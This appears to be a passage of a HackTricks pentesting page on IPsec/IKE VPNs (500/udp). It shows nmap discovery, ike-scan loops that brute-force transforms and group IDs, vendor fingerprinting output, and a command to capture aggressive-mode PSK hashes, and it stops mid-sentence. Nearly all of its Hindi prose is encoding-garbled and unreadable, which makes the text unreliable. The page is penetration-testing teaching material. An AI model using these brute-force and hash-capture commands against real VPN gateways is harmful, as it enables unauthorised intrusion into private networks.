# 500/udp - Pentesting IPsec/IKE VPN

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## Basic Information

**IPsec** рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ (LAN-to-LAN) рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реИ рдФрд░ рджреВрд░рд╕реНрде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдЧреЗрдЯрд╡реЗ (рджреВрд░рд╕реНрде рдкрд╣реБрдВрдЪ) рддрдХ, рдЬреЛ рдЙрджреНрдпрдо VPN рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рд░реАрдврд╝ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред

рджреЛ рдмрд┐рдВрджреБрдУрдВ рдХреЗ рдмреАрдЪ **рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдШ (SA)** рдХреА рд╕реНрдерд╛рдкрдирд╛ **IKE** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ ISAKMP рдХреЗ рддрд╣рдд рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдХреБрдВрдЬреА рд╡рд┐рдирд┐рдордп рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддреА рд╣реИ:

* **рдЪрд░рдг 1:** рджреЛ рдЕрдВрдд рдмрд┐рдВрджреБрдУрдВ рдХреЗ рдмреАрдЪ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдкреВрд░реНрд╡-рд╢реЗрдпрд░ рдХреА рдЧрдИ рдХреБрдВрдЬреА (PSK) рдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдореБрдЦреНрдп рдореЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдЬрд┐рд╕рдореЗрдВ рддреАрди рд╕рдВрджреЗрд╢ рдЬреЛрдбрд╝реЗ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдпрд╛ **рдЖрдХреНрд░рд╛рдордХ рдореЛрдб**ред
* **рдЪрд░рдг 1.5:** рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдЕрдирд┐рд╡рд╛рд░реНрдп рдирд╣реАрдВ рд╣реИ, рдЗрд╕ рдЪрд░рдг рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
* **рдЪрд░рдг 2:** рдпрд╣ рдЪрд░рдг рдбреЗрдЯрд╛ рдХреЛ **ESP** рдФрд░ **AH** рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░ рдкрд░ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдкрд┐рдд рд╣реИред рдпрд╣ **рдкрд░рдлреЗрдХреНрдЯ рдлреЙрд░рд╡рд░реНрдб рд╕реАрдХреНрд░реЗрд╕реА (PFS)** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд░рдг 1 рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдПрд▓реНрдЧреЛрд░рд┐рджрдо рд╕реЗ рднрд┐рдиреНрди рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 500/udp

## **nmap** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдвреВрдВрдврдирд╛**

IPSec рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗрд╡рд▓ рдПрдХ рдпрд╛ рдХреБрдЫ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдкрд░рд┐рд╡рд░реНрддрди рдорд╛рдиреЛрдВ рдХрд╛ рдПрдХ рд╕рдВрдпреЛрдЬрди рд╣реИред **рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рд╡рд░реНрддрди** рдореЗрдВ DES рдпрд╛ 3DES рдЬреИрд╕реЗ **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рджрдо**, SHA рдпрд╛ MD5 рдЬреИрд╕реЗ **рдЕрдЦрдВрдбрддрд╛ рдПрд▓реНрдЧреЛрд░рд┐рджрдо**, рдПрдХ рдкреВрд░реНрд╡-рд╢реЗрдпрд░ рдХреА рдХреЗ рд░реВрдк рдореЗрдВ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХрд╛рд░**, Diffie-Hellman 1 рдпрд╛ 2 рдХреЗ рд░реВрдк рдореЗрдВ рдХреБрдВрдЬреА **рд╡рд┐рддрд░рдг рдПрд▓реНрдЧреЛрд░рд┐рджрдо** рдФрд░ 28800 рд╕реЗрдХрдВрдб рдХреЗ рд░реВрдк рдореЗрдВ **рдЬреАрд╡рдирдХрд╛рд▓** рдЬреИрд╕реЗ рдХрдИ рдЧреБрдг рд╣реЛрддреЗ рд╣реИрдВред

рддреЛ, рдЖрдкрдХреЛ рдЬреЛ рдкрд╣рд▓рд╛ рдХрд╛рдо рдХрд░рдирд╛ рд╣реИ рд╡рд╣ рд╣реИ **рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдвреВрдВрдврдирд╛**, рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рдЖрдкрд╕реЗ рдмрд╛рдд рдХрд░ рд╕рдХреЗред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЙрдкрдХрд░рдг **ike-scan** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Ike-scan рдореБрдЦреНрдп рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдПрдХ ISAKMP рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдЧреЗрдЯрд╡реЗ рдХреЛ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХреЗ рдЕрдВрджрд░ **рдЖрда рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рд╕рд╛рде** рдПрдХрд▓ рдкреНрд░рд╕реНрддрд╛рд╡ рднреЗрдЬрддрд╛ рд╣реИред

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЖрдк рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
As you can see in the previous response, there is a field called **AUTH** with the value **PSK**. This means that the vpn is configured using a preshared key (and this is really good for a pentester).\
**The value of the last line is also very important:**

* _0 returned handshake; 0 returned notify:_ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд▓рдХреНрд╖реНрдп **IPsec рдЧреЗрдЯрд╡реЗ рдирд╣реАрдВ рд╣реИ**ред
* _**1 returned handshake; 0 returned notify:**_ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рд▓рдХреНрд╖реНрдп IPsec рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ IKE рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реИ, рдФрд░ рдЖрдк рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ рдкрд░рд┐рд╡рд░реНрддрди рд╕реНрд╡реАрдХрд╛рд░реНрдп рд╣реИрдВ** (рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
* _0 returned handshake; 1 returned notify:_ VPN рдЧреЗрдЯрд╡реЗ рддрдм рдПрдХ рд╕реВрдЪрдирд╛рддреНрдордХ рд╕рдВрджреЗрд╢ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм **рдХреЛрдИ рднреА рдкрд░рд┐рд╡рд░реНрддрди рд╕реНрд╡реАрдХрд╛рд░реНрдп рдирд╣реАрдВ рд╣реИ** (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреБрдЫ рдЧреЗрдЯрд╡реЗ рдРрд╕рд╛ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдЧреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд рдкреНрд░рд╕реНрддрд╛рд╡ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП)ред

рдлрд┐рд░, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рд╣реИ рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк 3рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ **рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдереЛрдбрд╝рд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:**

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
рдФрд░ рдлрд┐рд░ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ ike-scan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░реЗрдВ (рдЗрд╕рдореЗрдВ рдХрдИ рдорд┐рдирдЯ рд▓рдЧ рд╕рдХрддреЗ рд╣реИрдВ):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
рдпрджрд┐ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╢рд╛рдпрдж рд╕рд░реНрд╡рд░ рдмрд┐рдирд╛ рд╣реИрдВрдбрд╢реЗрдХ рдХреЗ рднреА рдорд╛рдиреНрдп рдЯреНрд░рд╛рдВрд╕рдлреЙрд░реНрдореНрд╕ рдкрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣рд╛ рд╣реИред рдлрд┐рд░, рдЖрдк рдЙрд╕реА рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХреЛ рдЖрдХреНрд░рд╛рдордХ рдореЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдЬрдорд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ **рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рд╡рд╛рдкрд╕ рдкреНрд░рддрд┐рдзреНрд╡рдирд┐рдд рд╣реЛрддрд╛ рд╣реИ**ред\
рдЖрдк [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕рдорд╛рди рд╣рдорд▓рд╛** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк [**ikeforce**](https://github.com/SpiderLabs/ikeforce) рдХреЗ рд╕рд╛рде рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рднреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

In **DH Group: 14 = 2048-рдмрд┐рдЯ MODP** рдФрд░ **15 = 3072-рдмрд┐рдЯ**\
**2 = HMAC-SHA = SHA1 (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ)ред `--trans` рдкреНрд░рд╛рд░реВрдк рд╣реИ $Enc,$Hash,$Auth,$DH**

Cisco рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ DH рд╕рдореВрд╣ 1 рдФрд░ 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдмрдЪреЗрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдкрд░реНрдпрд╛рдкреНрдд рдордЬрдмреВрдд рдирд╣реАрдВ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХрд╛ рдорд╛рдирдирд╛ рд╣реИ рдХрд┐ **рдЬрд┐рди рджреЗрд╢реЛрдВ рдХреЗ рдкрд╛рд╕ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╕рдВрд╕рд╛рдзрди рд╣реИрдВ, рд╡реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдЗрди рдХрдордЬреЛрд░ рд╕рдореВрд╣реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ рддреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред** рдпрд╣ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдХреЛрдб рдХреЛ рдЬрд▓реНрджреА рд╕реЗ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд░рддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдмрд╣реБрдд рдкреИрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ, рдпрд╣ рдЗрди рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рджреЗрд╢реЛрдВ рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдбреЗрдЯрд╛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдпрджрд┐ рдпрд╣ рдХрд┐рд╕реА рдХрдордЬреЛрд░ рд╕рдореВрд╣ (рдЬреИрд╕реЗ 1,024-рдмрд┐рдЯ рдпрд╛ рдЫреЛрдЯреЗ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред

### рд╕рд░реНрд╡рд░ рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯрд┐рдВрдЧ

рдлрд┐рд░, рдЖрдк ike-scan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдХрд░рдг рдХреЗ рд╡рд┐рдХреНрд░реЗрддрд╛** рдХреЛ рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрдкрдХрд░рдг рдПрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкреНрд░рд╕реНрддрд╛рд╡ рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ рдкреБрдирдГ рдЦреЗрд▓рдиреЗ рд╕реЗ рд░реБрдХ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдпрд╣ рдкреНрд░рд╛рдкреНрдд **рд╕рдВрджреЗрд╢реЛрдВ** рдХреЗ рдмреАрдЪ **рд╕рдордп** рдХреЗ рдЕрдВрддрд░ рдХрд╛ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг** рдХрд░реЗрдЧрд╛ рдФрд░ рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреИрдЯрд░реНрди рдХреЗ рд╕рд╛рде, рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ VPN рдЧреЗрдЯрд╡реЗ рд╡рд┐рдХреНрд░реЗрддрд╛ рдХрд╛ рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ VPN рд╕рд░реНрд╡рд░ рд╡реИрдХрд▓реНрдкрд┐рдХ **рд╡рд┐рдХреНрд░реЗрддрд╛ рдЖрдИрдбреА (VID) рдкреЗрд▓реЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ IKE рдХреЗ рд╕рд╛рдеред

**рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рддреЛ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ** (using --trans)

рдпрджрд┐ IKE рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ рдХрд┐ рд╡рд┐рдХреНрд░реЗрддрд╛ рдХреМрди рд╣реИ, рддреЛ рдпрд╣ рдЗрд╕реЗ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
рдпрд╣ nmap рд╕реНрдХреНрд░рд┐рдкреНрдЯ _**ike-version**_ рдХреЗ рд╕рд╛рде рднреА рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

## рд╕рд╣реА ID (рд╕рдореВрд╣ рдирд╛рдо) рдЦреЛрдЬрдирд╛

рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдПрдХ рдорд╛рдиреНрдп рдЯреНрд░рд╛рдВрд╕рдлреЙрд░реНрдореЗрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдЖрдХреНрд░рд╛рдордХ рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд╣реА ID (рд╕рдореВрд╣ рдирд╛рдо) рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдо рдирд╣реАрдВ рдкрддрд╛ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрд╕реЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред\
рдЗрд╕рдХреЗ рд▓рд┐рдП, рдореИрдВ рдЖрдкрдХреЛ 2 рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░реВрдВрдЧрд╛:

### ike-scan рдХреЗ рд╕рд╛рде ID рдХрд╛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдПрдХ рдирдХрд▓реА ID рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдЬрд┐рд╕рд╕реЗ рд╣реИрд╢ рдЗрдХрдЯреНрдард╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
рдпрджрд┐ **рдХреЛрдИ рд╣реИрд╢ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рддреЛ рд╢рд╛рдпрдж рдпрд╣ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХреА рд╡рд┐рдзрд┐ рдХрд╛рдо рдХрд░реЗрдЧреАред **рдпрджрд┐ рдХреБрдЫ рд╣реИрд╢ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдирдХрд▓реА рд╣реИрд╢ рдПрдХ рдирдХрд▓реА рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╡рд┐рдзрд┐ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдирд╣реАрдВ рд╣реЛрдЧреАред** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдирдХрд▓реА рд╣реИрд╢ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ рдЖрдзреБрдирд┐рдХ 